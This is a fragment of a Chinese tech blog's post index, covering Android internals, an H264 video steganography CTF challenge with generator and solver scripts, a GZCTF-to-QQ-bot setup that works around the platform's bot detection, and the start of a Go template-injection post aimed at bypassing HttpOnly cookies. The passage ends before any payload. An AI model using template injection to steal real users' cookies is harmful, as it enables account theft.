生成的。 系统内置的应用程序以及非系统级的应用程序都属于应用层，负责与用户进行直接交互。","tags":["2024","Android","AndroidArchitechture"],"categories":["Study","Android"]},{"title":"DVM/ART介绍","path":"/2024/09/15/DVM-ART介绍/","content":"DVM&#x2F;ART介绍目录 1 什么是DVM 2 有什么用 3 与JVM区别 4 引用 1 什么是DVMDVM是Dalvik Virtual Machine的缩写，是安卓虚拟机的缩写（为什么不叫AVM-Android Virtual Machine呢？原因是其作者以其祖上居住过的名为Dalvik的村子命名）。 在 Android 5.0 之前叫作 DVM，5.0 之后改为 ART（Android Runtime）。 2 有什么用Dalvik 是 Google 公司自己设计用于 Android 平台的 Java 虚拟机，Android 工程师编写的 Java 或者 Kotlin 代码最终都是在这台虚拟机中被执行的。 3 与JVM区别 Dalvik: 基于寄存器，编译和运行都会更快些 JVM: 基于栈, 编译和运行都会慢些 不过这里不是直接操作硬件的寄存器，而是在内存中模拟一组寄存器。 Dalvik: 执行.dex格式的字节码，是对.class文件进行压缩后产生的,文件变小 JVM: 执行.class格式的字节码 传统 Class 文件是由一个 Java 源码文件生成的 .Class 文件，而 Android 是把所有 Class 文件进行合并优化，然后生成一个最终的 class.dex 文件。dex 文件去除了 class 文件中的冗余信息（比如重复字符常量），并且结构更加紧凑，因此在 dex 解析阶段，可以减少 I&#x2F;O 操作，提高了类的查找速度。 Dalvik : 一个应用启动都运行一个单独的虚拟机运行在一个单独的进程中 JVM: 只能运行一个实例, 也就是所有应用都运行在同一个JVM中","tags":["2024","AndroidRuntime","Android"],"categories":["Study","Android"]},{"title":"H264编码分析及隐写实践","path":"/2024/04/29/H264编码分析及隐写实践/","content":"H264编码分析及隐写实践目录 1 视频数据层级 2 H264裸流 3 NALU 4 RBSP 4.1 指数哥伦布熵编码 5 NALU种类 6 实践 6.1 修改IDR帧类型 6.2 修改其他帧类型 6.3 重新封装 6.4 修复 7 总结 8 参考 CTF竞赛中经常出现图片隐写，视频作为更高量级的信息载体，应当有更大的隐写空间。本文就简单介绍一下H264编码以及一次校赛相关出题经历。 1 视频数据层级平常我们生活中遇到的大部分是FLV、AVI等等的视频格式，但实际上这只是一种封装，实际的数据还是要看视频的编码，就比如H264。像我们平时在视频网站看到的视频就是通过HTTP协议传输的，直播则是RTMP协议，协议承载的一般是封装后的视频数据。 下图就很好的展示了视频数据的各个层级。 2 H264裸流得到最原始的视频数据，需要提取H264裸流。 简单介绍一下ffmpeg的用法，不指定格式的情况下，ffmpeg会识别给定文件名的后缀自动进行转换，比如 1ffmpeg input.flv output.mp4 就会自动转换为mp4 如何提取一个H264编码的视频裸流呢。 使用以下命令。 1ffmpeg -vcodec copy -i input.flv output.h264 默认不加参数的情况，ffmpeg会把视频重新编码，视频数据会发生变化，所以要加上-vcodec copy，指示ffmpeg直接复制视频流，而不是重新编码。 这样得到的h264裸流就是封装格式中的原始数据。 有了H264裸流，可以使用https://github.com/latelee/H264BSAnalyzerhttps://github.com/latelee/H264BSAnalyzer的工具查看裸流信息。 3 NALUH.264裸流是由⼀个接⼀个NALU组成。H264对NALU的封装有两种方式，一种是AnnexB，一种是 avcC。 这里仅介绍AnnexB，对avcC感兴趣的可以看https://www.zzsin.com/article/avc_1_annex_b.htmlhttps://www.zzsin.com/article/avc_1_annex_b.html。 AnnexB的封装很简单，以00 00 00 01或者00 00 01开头作为一个新NALU的标志，为了防止竞争，即 NALU数据中出现00 00 00 01导致解码器误认为是一个新的NALU，所以采用了一些防竞争的策略。 123400 00 00 =&gt; 00 00 03 0000 00 01 =&gt; 00 00 03 0100 00 02 =&gt; 00 00 03 0200 00 03 =&gt; 00 00 03 03 看一眼下面的图就很清楚了。 那么也就是说当我们把数据从H264裸流中提取出来之后，还需要对防竞争字节进行还原。 这里的话对这些类型的数据有些定义，详细可以去看https://www.zzsin.com/article/avc_3_5_rbsp.htmlhttps://www.zzsin.com/article/avc_3_5_rbsp.html。 NALU：去除00 00 00 01标志符的数据 EBSP：去除NALU header（通常是第一个字节）但未还原防竞争字节的数据 RBSP：将EBSP还原防竞争字节后的数据 12345678一段AnnexB封装的NALU: 00 00 00 01 67 64 00 1F AC D9 40 50 05 BB 01 6A 02 02 02 80 00 00 03 00 80 00 00 1E 07 8C 18 CBNALU: 67 64 00 1F AC D9 40 50 05 BB 01 6A 02 02 02 80 00 00 03 00 80 00 00 1E 07 8C 18 CBEBSP: 64 00 1F AC D9 40 50 05 BB 01 6A 02 02 02 80 00 00 03 00 80 00 00 1E 07 8C 18 CBRBSP: 64 00 1F AC D9 40 50 05 BB 01 6A 02 02 02 80 00 00 00 80 00 00 1E 07 8C 18 CB 4 RBSP现在有了NALU数据，我们就可以对着https://www.itu.int/rec/T-REC-H.264-202108-I/enhttps://www.itu.int/rec/T-REC-H.264-202108-I/en上的内容来一步步解码了。 直接看到手册7.3节，这里是表格式的语法，右边的Descriptor描述了数据的格式及占用的bit数，比如第一个f(1)表示1bit fixed-pattern bit string。 可以在7.2节找到所有的Descriptor定义 还是拿之间的数据做例子 1267 64 00 1F AC D9 40 50 05 BB 01 6A 02 02 02 80 00 00 00 80 00 00 1E 07 8C 18 CB 第一个字节为0b01100111（这部分称为NALU header），那么 1234forbidden_zero_bit= (byte &gt;&gt; 7) &amp; 0x1 = 0nal_ref_idc = (byte &gt;&gt; 5) &amp; 0x3 = 3nal_unit_type = byte &amp; 0x1F = 7 有了nal_unit_type，可以在7.4节的Table 7-1找到对应的类型和对RBSP数据的解析。 4.1 指数哥伦布熵编码在Descriptor中有以下几种特殊的编码 无符号指数哥伦布熵编码 ue(v) 有符号指数哥伦布熵编码 se(v) 映射指数哥伦布熵编码 me(v) 截断指数哥伦布熵编码 te(v) 这部分建议跟着https://www.bilibili.com/video/BV1V3411m7xK/?spm_id_from=333.788\\&vd_source=de47681dd68ed49471df89ada190d371https://www.bilibili.com/video/BV1V3411m7xK/?spm_id_from=333.788\\&vd_source=de47681dd68ed49471df89ada190d371来自己复现一下。 5 NALU种类NALU种类有很多，简单介绍几个重要的 SPS（Sequence Paramater Set）：序列参数集， 包括一个图像序列的所有信息，如图像尺寸、视频格式等。 PPS（Picture Paramater Set）：图像参数集，包括一个图像的所有分片的所有相关信息，包括图像类型、序列号等。 在传输视频流之前，必须要传输这两类参数，不然无法解码。为了保证容错性，每一个 I 帧前面，都会传一遍这两个参数集合。 一个流由多个帧序列组成，一个序列由以下三种帧组成。 I帧（Intra-coded picture帧内编码图像帧）：不参考其他图像帧，只利⽤本帧的信息进⾏编码。 P帧（Predictive-codedPicture预测编码图像帧）：利⽤之前的I帧或P帧，采⽤运动预测的⽅式进⾏帧间预测编码。 B帧（Bidirectionallypredicted picture双向预测编码图像帧）：提供最⾼的压缩⽐，它既需要之前的图像帧(I帧或P帧)，也需要后来的图像帧(P帧)，采⽤运动预测的⽅式进⾏帧间双向预测编码。 这些个帧组成一个序列，每个序列的第一个帧是IDR帧 IDR（Instantaneous Decoding Refresh，即时解码刷新）：⼀个序列的第⼀个图像叫做 IDR 图像（⽴即刷新图像），IDR 图像都是 I 帧图像。 IDR帧必须是I帧，但是I帧可以不是IDR帧。 其他 SEI（Supplemental Enhancement Information辅助增强信息）：SEI是H264标准中一个重要的技术，主要起补充和增强的作用。 SEI没有图像数据信息，只是对图像数据信息或者视频流的补充，有些内容可能对解码有帮助. 6 实践在BUAACTF2024中出了一道H264编码的视频题，思路如下。 首先有一个正常的带flag的视频 希望把视频损坏，但是是可修复的损坏。 首先用ffmpeg重新编码一下，不然太清晰裸流的文件大小很大 1os.system(&#x27;ffmpeg -i flag.mp4 -c:v libx264 -crf 18 -preset medium -c:a aac -b:a 128k encode-origin.h264 &#x27;) 并生成一个H264裸流文件，接下来就是对H264裸流进行操作。 python中操作H264裸流可以用https://github.com/slhck/h26x-extractorhttps://github.com/slhck/h26x-extractor库 1234H26xParser = H26xParser(ORIGIN_H264, verbose=False)H26xParser.parse()nalu_list = H26xParser.nalu_pos nalu_pos方法 返回的是一个元组列表，前两个表示的是nalu数据的开始字节和结束字节 然后获取rbsp数据，用getRSBP方法，这个方法返回的数据是包含NALU头部的。 123456for tu in nalu_list: start, end, _, _, _, _ = tu rbsp = bytes(H26xParser.getRSBP(start, end)) nalu_header = rbsp[0] nal_unit_type = nalu_header &amp; 0x1F nalu_body = rbsp[1:] 6.1 修改IDR帧类型前面提到，IDR帧的类型必须是I帧，所以可以将他的类型进行改变。改变IDR帧的帧类型 12if nal_unit_type == 5: origin_data[start + 1] = origin_data[start + 1] | 0x4 # 把关键帧slice_type改为11 nal_unit_type == 5意味着这是一个IDR帧，然后看IDR的解析语法 找到slice_layer_without_partitioning_rbsp() 找到slice_header() ue(v)就是我们前面提到的无符号指数哥伦布编码。 来看看如何使用无符号指数哥伦布进行编码： 先把要编码的数字加 1，假设我们要编码的数字是 4，那么我们先对 4 加 1，就是 5。 将加 1 后的数字 5 先转换成二进制，就是： 101。 转化成二进制之后，我们看转化成的二进制有多少位，然后在前面补位数减一个 0 。例如，101 有 3 位，那么我们应该在前面补两个 0。 最后，4 进行无符号指数哥伦布编码之后得到的二进制码流就是 0 0 1 0 1。 而前面的first_mb_in_slice表示该slice的第一个宏块在图像中的位置，涉及到一些更深入的知识，但是这里不用关心，因为我们的情况中first_mb_in_slice始终为0。 slice_type就是我们的帧类型，同样在7.4节给出了不同类型对应的值。 观察我们正常的h264裸流，这个slice_type的值都是被设置为7。 所以从RBSP的第一个字节开始，0的无符号指数哥伦布熵编码是0b1，7的无符号指数哥伦布熵编码是0b0001000，比特流应当是 10b 1 0001000 xxxxxxx 找一个IDR帧的数据来验证一下 100 00 01 65 88 84 00 6F F9 C3 AB 0F 3B E0 BC 1E 03 54 39 CD 48 64 95 22 F4 6E AA 45 2F E6 8A 4F A2 1D 61 88 5C B2 0F 61 41 11 81 69 27 E5 93 DE D3 15 0D A2 97 F7 9A 41 E7 DF D5 B0 BD 50 57 D9 30 65 42 D9 RBSP为 188 84 00 ..... 88恰好对应0b10001000 所以我直接对这个字节byte | 0x4，让这个字节变成0b10001100，于是slice_type就变成了11。这里主要是为了好处理数据，所以直接用二进制运算，实际上slice_type想改多少都可以。 修改后IDR的信息如下 6.2 修改其他帧类型关于其他帧类型的修改，题目是将所有帧类型都改为B帧，然后记录下原来的帧类型，存放在每个IDR帧之后的SEI帧里，供后续修复。 12345if nal_unit_type == 1: #修改slice slice_type = extract_slice_type(nalu_body) origin_slice_type_list.append(SLICE_TYPES[slice_type % 5]) print(SLICE_TYPES[slice_type % 5], end=&#x27; &#x27;) origin_data[start + 1] = origin_data[start + 1] | 0x4 # 非关键帧全部变为B帧 效果如下 SEI内容 6.3 重新封装由于ffmpeg的转换会重新编码，所以还是一样要加上-vcodec copy参数，使其不重新编码，而是只做封装。 12os.system(f&quot;ffmpeg -i &#123;OUTPUT_H264&#125; -vcodec copy &#123;OUTPUT_MP4&#125;&quot;) 最后的视频成了这样 放出完整的出题脚本，只需要修改FLAG_VIDEO就可以生成。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114import osfrom h26x_extractor.h26x_parser import H26xParserfrom uuid import uuid4SLICE_TYPES = &#123;0: &#x27;P&#x27;, 1: &#x27;B&#x27;, 2: &#x27;I&#x27;, 3: &#x27;SP&#x27;, 4: &#x27;SI&#x27;&#125;FLAG_VIDEO = &#x27;flag.mp4&#x27;ORIGIN_H264=&#x27;encode-origin.h264&#x27;OUTPUT_H264=&#x27;encode-new.h264&#x27;OUTPUT_MP4=&#x27;encode-output.mp4&#x27;OUTPUT_FLV=&#x27;encode-output.flv&#x27;class BitStream: def __init__(self, buf): self.buffer = buf self.bit_pos = 0 self.byte_pos = 0 def ue(self): count = 0 while self.u(1) == 0: count += 1 res = ((1 &lt;&lt; count) | self.u(count)) - 1 return res def u1(self): self.bit_pos += 1 res = self.buffer[self.byte_pos] &gt;&gt; (8 - self.bit_pos) &amp; 0x01 if self.bit_pos == 8: self.byte_pos += 1 self.bit_pos = 0 return res def u(self, n: int): res = 0 for i in range(n): res &lt;&lt;= 1 res |= self.u1() return resdef extract_slice_type(nalu_body): body = BitStream(nalu_body) #print(nalu_body[:3]) first_mb_in_slice = body.ue() slice_type = body.ue() return slice_typedef generate_sequence_data(origin_slice_type_list: list): sei_data = b&#x27;\\x00\\x00\\x01\\x06\\x05&#x27; sei_payload_len = len(origin_slice_type_list) + 16 uuid = uuid4().bytes while sei_payload_len &gt; 255: sei_payload_len -= 255 sei_data += b&#x27;\\xFF&#x27; sei_payload = uuid + &#x27;&#x27;.join(origin_slice_type_list).encode() sei_data += int.to_bytes(sei_payload_len, 1, &#x27;big&#x27;) sei_data += sei_payload sei_data += b&#x27;\\x80&#x27; return sei_dataif __name__ == &#x27;__main__&#x27;: os.system(f&#x27;ffmpeg -i &#123;FLAG_VIDEO&#125; -c:v libx264 -crf 18 -preset medium -c:a aac -b:a 128k &#123;ORIGIN_H264&#125;&#x27;) f = open(ORIGIN_H264, &#x27;rb&#x27;) origin_data = list(f.read()) f.close() # 进行加密 H26xParser = H26xParser(ORIGIN_H264, verbose=False) H26xParser.parse() nalu_list = H26xParser.nalu_pos print(nalu_list) data = H26xParser.byte_stream origin_slice_type_list = [] sei_data_list = [] for tu in nalu_list: start, end, _, _, _, _ = tu rbsp = bytes(H26xParser.getRSBP(start, end)) nalu_header = rbsp[0] nal_unit_type = nalu_header &amp; 0x1F nalu_body = rbsp[1:] if nal_unit_type == 1: #修改slice slice_type = extract_slice_type(nalu_body) origin_slice_type_list.append(SLICE_TYPES[slice_type % 5]) print(SLICE_TYPES[slice_type % 5], end=&#x27; &#x27;) origin_data[start + 1] = origin_data[start + 1] | 0x4 # 非关键帧全部变为B帧 elif nal_unit_type == 5: origin_data[start + 1] = origin_data[start + 1] | 0x4 # 把关键帧slice_type改为11 elif nal_unit_type == 7 and origin_slice_type_list: sei_data_list.append(generate_sequence_data(origin_slice_type_list)) origin_slice_type_list = [] sei_data_list.append(generate_sequence_data(origin_slice_type_list)) # 构造新数据 origin_slice_type_list = [] new_data = b&#x27;&#x27; start_pos = 0 count = 0 for start, end, _, _, _, _ in nalu_list: rbsp = bytes(H26xParser.getRSBP(start, end)) nalu_header = rbsp[0] nal_unit_type = nalu_header &amp; 0x1F if nal_unit_type == 5: new_data += bytes(origin_data[start_pos:end]) + sei_data_list[count] count += 1 start_pos = end new_data += bytes(origin_data[start_pos:]) # 输出 f = open(OUTPUT_H264, &#x27;wb&#x27;) f.write(bytes(new_data)) f.close() # 封装 os.system(f&quot;ffmpeg -i &#123;OUTPUT_H264&#125; -vcodec copy &#123;OUTPUT_MP4&#125;&quot;) os.system(f&quot;ffmpeg -i &#123;OUTPUT_MP4&#125; -vcodec copy &#123;OUTPUT_FLV&#125;&quot;) 6.4 修复理解了出题思路，解题就比较简单。将EXTRACT_VIDEO修改为损坏的视频即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697import osfrom h26x_extractor.h26x_parser import H26xParserfrom uuid import uuid4SLICE_TYPES = &#123;0: &#x27;P&#x27;, 1: &#x27;B&#x27;, 2: &#x27;I&#x27;, 3: &#x27;SP&#x27;, 4: &#x27;SI&#x27;&#125;EXTRACT_VIDEO = &#x27;final/extract.flv&#x27;ORIGIN_H264 = &#x27;decode-extract.h264&#x27;OUTPUT_H264 = &#x27;decode-origin.h264&#x27;OUTPUT_MP4 = &#x27;decode-origin.mp4&#x27;class BitStream: def __init__(self, buf): self.buffer = buf self.bit_pos = 0 self.byte_pos = 0 def ue(self): count = 0 while self.u(1) == 0: count += 1 res = ((1 &lt;&lt; count) | self.u(count)) - 1 return res def u1(self): self.bit_pos += 1 res = self.buffer[self.byte_pos] &gt;&gt; (8 - self.bit_pos) &amp; 0x01 if self.bit_pos == 8: self.byte_pos += 1 self.bit_pos = 0 return res def u(self, n: int): res = 0 for i in range(n): res &lt;&lt;= 1 res |= self.u1() return resdef extract_slice_type(nalu_body): body = BitStream(nalu_body) #print(nalu_body[:3]) first_mb_in_slice = body.ue() slice_type = body.ue() return slice_typedef read_sei(nalu_body): payload_type = nalu_body[0] payload_size = 0 i = 1 while nalu_body[i] == 0xff: payload_size+=255 i+=1 payload_size += nalu_body[i] return [chr(i) for i in nalu_body[i+1+16:i+1+payload_size]]if __name__ == &#x27;__main__&#x27;: os.system(f&#x27;ffmpeg -i &#123;EXTRACT_VIDEO&#125; -vcodec copy &#123;ORIGIN_H264&#125;&#x27;) f = open(ORIGIN_H264, &#x27;rb&#x27;) origin_data = list(f.read()) f.close() # 进行解密 H26xParser = H26xParser(ORIGIN_H264, verbose=False) H26xParser.parse() nalu_list = H26xParser.nalu_pos data = H26xParser.byte_stream origin_slice_type_list = [] prev_unit_type = 0 count=0 for tu in nalu_list: start, end, _, _, _, _ = tu rbsp = bytes(H26xParser.getRSBP(start, end)) nalu_header = rbsp[0] nal_unit_type = nalu_header &amp; 0x1F nalu_body = rbsp[1:] if nal_unit_type == 1: #修改slice if origin_slice_type_list[count]==&#x27;P&#x27;: origin_data[start + 1] = origin_data[start + 1] ^ 0x4 elif nal_unit_type == 5: origin_data[start + 1] = origin_data[start + 1] ^ 0x4 elif nal_unit_type == 6 and prev_unit_type == 5: count=0 print(read_sei(nalu_body)) origin_slice_type_list = read_sei(nalu_body) prev_unit_type = nal_unit_type new_data = bytes(origin_data) # 输出 f = open(OUTPUT_H264, &#x27;wb&#x27;) f.write(bytes(new_data)) f.close() # 封装 os.system(f&quot;ffmpeg -i &#123;OUTPUT_H264&#125; -vcodec copy &#123;OUTPUT_MP4&#125;&quot;) 7 总结关于视频编码的隐写还有很多待发掘的地方，本文仅抛砖引玉，比如YUV像素信息就可以尝试LSB隐写。希望对你有些启发。 8 参考https://zhuanlan.zhihu.com/p/409527359https://zhuanlan.zhihu.com/p/409527359 https://zhuanlan.zhihu.com/p/419901787?utm_id=0https://zhuanlan.zhihu.com/p/419901787?utm_id=0 https://github.com/yistLin/H264-Encoder/blob/master/doc/ITU-T%20H.264.pdfhttps://github.com/yistLin/H264-Encoder/blob/master/doc/ITU-T%20H.264.pdf https://www.itu.int/rec/T-REC-H.264-202108-I/enhttps://www.itu.int/rec/T-REC-H.264-202108-I/en https://www.zzsin.com/article/avc_0_5_what_is_nalu.htmlhttps://www.zzsin.com/article/avc_0_5_what_is_nalu.html https://github.com/slhck/h26x-extractorhttps://github.com/slhck/h26x-extractor","tags":["ctf","2024","h264"],"categories":["Study"]},{"title":"GZCTF平台对接QQ机器人","path":"/2024/04/23/GZCTF平台对接QQ机器人/","content":"GZCTF平台对接QQ机器人本文章写于2024-04-23，不保证后续可用性。 参考 https://github.com/mamoe/miraihttps://github.com/mamoe/mirai https://qchatgpt.rockchin.top/posts/deploy/platforms/mirai.html#安装-mirai-api-httphttps://qchatgpt.rockchin.top/posts/deploy/platforms/mirai.html#安装-mirai-api-http 采用mirai项目 安装mirai用mirai-installer安装 https://github.com/iTXTech/mcl-installerhttps://github.com/iTXTech/mcl-installer 安装 1./mcl-installer 初始化 1./mcl 安装完毕 插件安装及配置mirai-http-api插件用于开放接口 https://github.com/project-mirai/mirai-api-httphttps://github.com/project-mirai/mirai-api-http 打开mcl后输入 1mcl --update-package net.mamoe:mirai-api-http --channel stable-v2 --type plugin 即可安装成功 配置文件setting.yml 123456789101112131415161718192021222324252627282930313233343536373839## 配置文件中的值，全为默认值## 启用的 adapter, 内置有 http, ws, reverse-ws, webhookadapters: - http - ws## 是否开启认证流程, 若为 true 则建立连接时需要验证 verifyKey## 建议公网连接时开启enableVerify: true verifyKey: 1234567890 ## 开启一些调试信息debug: false## 是否开启单 session 模式, 若为 true，则自动创建 session 绑定 console 中登录的 bot## 开启后，接口中任何 sessionKey 不需要传递参数## 若 console 中有多个 bot 登录，则行为未定义## 确保 console 中只有一个 bot 登录时启用singleMode: false## 历史消息的缓存大小## 同时，也是 http adapter 的消息队列容量cacheSize: 4096## adapter 的单独配置，键名与 adapters 项配置相同adapterSettings: ## 详情看 http adapter 使用说明 配置 http: host: localhost port: 8080 cors: [&quot;*&quot;] unreadQueueMaxSize: 100 ## 详情看 websocket adapter 使用说明 配置 ws: host: localhost port: 8080 reservedSyncId: -1 采用http，verifykey是后续用于认证的。如若使用Docker开放端口，host要改为0.0.0.0，不然访问不到。 我的配置 1234567891011121314151617adapters: - httpenableVerify: trueverifyKey: 1234567890debug: falsesingleMode: falsecacheSize: 4096adapterSettings: http: host: 0.0.0.0 port: 7777 cors: [&quot;*&quot;] unreadQueueMaxSize: 100 loginsolver插件用于登录，拖入plugins即可 https://github.com/KasukuSakura/mirai-login-solver-sakurahttps://github.com/KasukuSakura/mirai-login-solver-sakura 需要用到22333端口，docker中记得开放，登录时会返回地址，需要用手机下载Sakuralogin来输入地址登录。 签名服务器Qsign https://github.com/MrXiaoM/qsignhttps://github.com/MrXiaoM/qsign 下载时下载d62ddce版本，将plugins中的jar放到bot的plugins中，将txlib放到bot的根目录即可。 要修改配置文件中的协议版本为8.9.90 配置即可完成 运行运行mcl 1./mcl 使用内置命令登录，最好使用ANDROID_PAD，手表协议发20条就会风控。 1/login qq password ANDROID_PAD 登录完之后可以设置autoLogin，具体不赘述。 使用使用的什么adapter就看什么，详细描述了api接口 https://docs.mirai.mamoe.net/mirai-api-http/adapter/HttpAdapter.htmlhttps://docs.mirai.mamoe.net/mirai-api-http/adapter/HttpAdapter.html 简单实现的一个python bot类，抛砖引玉，还可以继续扩展。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import requestsVERIFY_KEY = &#x27;&#x27;BOT_URL = &#x27;http://x.x.x.x:7777&#x27;class Bot: def __init__(self, verify_key: str, url: str, qq: str): self.verify_key = verify_key self.url = url self.qq = qq self.session = self.verify() self.bind() def verify(self): url = f&#x27;&#123;self.url&#125;/verify&#x27; data = &#123;&quot;verifyKey&quot;: self.verify_key&#125; req = requests.post(url, json=data) return req.json()[&#x27;session&#x27;] def bind(self): url = f&#x27;&#123;self.url&#125;/bind&#x27; data = &#123;&quot;sessionKey&quot;: self.session, &#x27;qq&#x27;: self.qq&#125; req = requests.post(url, json=data) return req.json()[&#x27;msg&#x27;] def rebind(self): # 由于30分钟不使用就会过期，所以要重新绑定。 self.session = self.verify() self.bind() def get_group_list(self): self.check_session() url = f&#x27;&#123;self.url&#125;/groupList?sessionKey=&#123;self.session&#125;&#x27; rep = requests.get(url) return rep.json() def check_session(self): # 检测session是否过期 url = f&#x27;&#123;self.url&#125;/sessionInfo?sessionKey=&#123;self.session&#125;&#x27; rep = requests.get(url) if rep.json()[&#x27;code&#x27;] == 3: self.rebind() return def send_group_message(self, id: int, message: str): self.check_session() url = f&#x27;&#123;self.url&#125;/sendGroupMessage&#x27; data = &#123;&quot;sessionKey&quot;: self.session, &#x27;target&#x27;: id, &#x27;messageChain&#x27;: [ &#123;&quot;type&quot;: &quot;Plain&quot;, &quot;text&quot;: message&#125;, ]&#125; req = requests.post(url, json=data) return req.json()[&#x27;msg&#x27;]if __name__ == &#x27;__main__&#x27;: bot = Bot(VERIFY_KEY, BOT_URL, &#x27;0000000000&#x27;) print(bot.get_group_list()) print(bot.send_group_message(0000000000, &#x27;123123&#x27;)) 对接GZCTF平台 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import timefrom datetime import timezone, timedeltaimport requestsfrom dateutil.parser import isoparsefrom bot import Botimport loggingfrom rich.logging import RichHandlerfrom rich.status import StatusINTERVAL = 2 # 间隔时间FORMAT = &quot;%(message)s&quot;VERIFY_KEY = &#x27;&#x27; # mirai-http-api verify keyBOT_URL = &#x27;http://0.0.0.0:7777&#x27; # mirai-http-api bot urlBOT_QQ = &#x27;&#x27; # bot qq号GROUP_NOTICE_ID = &#x27;&#x27; # 发送的群号BOT = Bot(VERIFY_KEY, BOT_URL, BOT_QQ)API_URL = &#x27;http://0.0.0.0/api/game/4/notices&#x27; # 比赛通知apiBANNER = &#x27;&#x27;NOW_ID = 0TEMPLATES = &#123; &#x27;Normal&#x27;: &#x27;【比赛公告】 内容：%s 时间：%s&#x27;, &#x27;NewChallenge&#x27;: &#x27;【新增题目】 [%s] 时间：%s&#x27;, &#x27;NewHint&#x27;: &#x27;【题目提示】 [%s]有新提示，请注意查收 时间：%s&#x27;, &#x27;FirstBlood&#x27;: &#x27;【一血播报】 恭喜%s拿下[%s]一血 时间：%s&#x27;, &#x27;SecondBlood&#x27;: &#x27; 【二血播报】 恭喜%s拿下[%s]二血 时间：%s&#x27;, &#x27;ThirdBlood&#x27;: &#x27; 【三血播报】 恭喜%s拿下[%s]三血 时间：%s&#x27;&#125;def processTime(t): t_truncated = t[:26] + t[26:].split(&#x27;+&#x27;)[0] input_time = isoparse(t_truncated) input_time_utc = input_time.replace(tzinfo=timezone.utc) beijing_timezone = timezone(timedelta(hours=8)) beijing_time = input_time_utc.astimezone(beijing_timezone) return beijing_time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)if __name__ == &#x27;__main__&#x27;: logging.basicConfig( level=logging.INFO, format=FORMAT, datefmt=&quot;[%X]&quot;, handlers=[RichHandler()] ) log = logging.getLogger(&quot;rich&quot;) notices = requests.get(API_URL).json() notices = sorted(notices, key=lambda x: x[&#x27;id&#x27;]) NOW_ID = notices[-1][&#x27;id&#x27;] #NOW_ID -= 1 status = Status(&#x27;Waiting for new notice&#x27;) status.start() while True: try: notices = requests.get(API_URL).json() except KeyboardInterrupt: log.info(&#x27;Exit bot&#x27;) break except Exception: log.warning(&#x27;Warning: request failed&#x27;) continue notices = sorted(notices, key=lambda x: x[&#x27;id&#x27;]) for notice in notices: if notice[&#x27;id&#x27;] &gt; NOW_ID: message = TEMPLATES[notice[&#x27;type&#x27;]] % tuple(notice[&#x27;values&#x27;] + [processTime(notice[&#x27;time&#x27;])]) log.info(f&#x27;sending to &#123;GROUP_NOTICE_ID&#125; message: &#123;message&#125;&#x27;) BOT.send_group_message(GROUP_NOTICE_ID, message) NOW_ID = notice[&#x27;id&#x27;] try: time.sleep(INTERVAL) except KeyboardInterrupt: log.info(&#x27;Exit bot&#x27;) break status.stop() 还是挺稳的。","tags":["ctf","2024","qqbot","config"],"categories":["Config"]},{"title":"简析Go SSTI利用","path":"/2024/03/22/简析Go SSTI利用/","content":"简析Go SSTI利用目录 Go SSTI基础 模版渲染 Action Pipelines Variable gin.context的利用方式 Hgame2024 Week2 梅开二度 总结 Go ssti的xss利用 简单来说就是可以利Go的模版注入，来绕过Cookie的HTTPOnly安全限制 Go SSTI基础参考go官方文档 https://pkg.go.dev/text/templatehttps://pkg.go.dev/text/template 模版渲染go的模版渲染使用的是&#123;&#123;&#125;&#125; 简单的例子 123456789type Inventory struct &#123; Material string Count uint&#125;sweaters := Inventory&#123;&quot;wool&quot;, 17&#125;tmpl, err := template.New(&quot;test&quot;).Parse(&quot;&#123;&#123;.Count&#125;&#125; items are made of &#123;&#123;.Material&#125;&#125;&quot;)if err != nil &#123; panic(err) &#125;err = tmpl.Execute(os.Stdout, sweaters)if err != nil &#123; panic(err) &#125; 可以看到17和wool被渲染进去了。 Action官方的给出的Action如下 123456789101112131415161718192021222324252627282930313233&#123;&#123;/* a comment */&#125;&#125;&#123;&#123;- /* a comment with white space trimmed from preceding and following text */ -&#125;&#125;&#123;&#123;pipeline&#125;&#125; 我们可以把pipeline视作函数或者某个属性值 &#123;&#123;if pipeline&#125;&#125; T1 &#123;&#123;end&#125;&#125;&#123;&#123;if pipeline&#125;&#125; T1 &#123;&#123;else&#125;&#125; T0 &#123;&#123;end&#125;&#125;&#123;&#123;if pipeline&#125;&#125; T1 &#123;&#123;else if pipeline&#125;&#125; T0 &#123;&#123;end&#125;&#125;&#123;&#123;range pipeline&#125;&#125; T1 &#123;&#123;end&#125;&#125;&#123;&#123;range pipeline&#125;&#125; T1 &#123;&#123;else&#125;&#125; T0 &#123;&#123;end&#125;&#125; 当pipeline返回的array长度为0时，执行T0 &#123;&#123;break&#125;&#125;&#123;&#123;continue&#125;&#125;&#123;&#123;template &quot;name&quot;&#125;&#125; 渲染名称为name的模版。&#123;&#123;template &quot;name&quot; pipeline&#125;&#125; 以pipeline为name模版的传入数据。&#123;&#123;block &quot;name&quot; pipeline&#125;&#125; T1 &#123;&#123;end&#125;&#125; block是定义template的一种速记，相当于定义并执行，上面这条就是将pipeline渲染到T1模版里，并定义T1为名称为name的模版，相当于以下两条的结合。 &#123;&#123;define &quot;name&quot;&#125;&#125; T1 &#123;&#123;end&#125;&#125; &#123;&#123;template &quot;name&quot; pipeline&#125;&#125; 典型的用法是定义一组根模版，然后通过block重新定义来定制这些模板。&#123;&#123;with pipeline&#125;&#125; T1 &#123;&#123;end&#125;&#125; 如果管道值为空，则不产生输出；否则，dot 将被设置为管道值，T1 将被执行。 &#123;&#123;with pipeline&#125;&#125; T1 &#123;&#123;else&#125;&#125; T0 &#123;&#123;end&#125;&#125; 如果管道值为空，dot不受影响，T0会被执行；否则，dot会被设置为pipeline的值，T1 会被执行。 with和if的区别在于with会将返回值储存在&quot;.&quot;中，后续可以访问。 举一个with的例子 1tmpl, err := template.New(&quot;test&quot;).Parse(&quot;&#123;&#123;with .Count&#125;&#125;&#123;&#123;.&#125;&#125; items are made of &#123;&#123;end&#125;&#125;&#123;&#123;.Material&#125;&#125;&quot;) Pipelines123456Argument 参数.Method [Argument...] 方法functionName [Argument...] 函数 pipeline之间可以用管道连接符|来连接，前者的返回值将作为后者的最后一个参数传递 VariableAction内的pipelin可以初始化变量的值 123$variable := pipelinerange $index, $element := pipeline gin.context的利用方式参考go文档 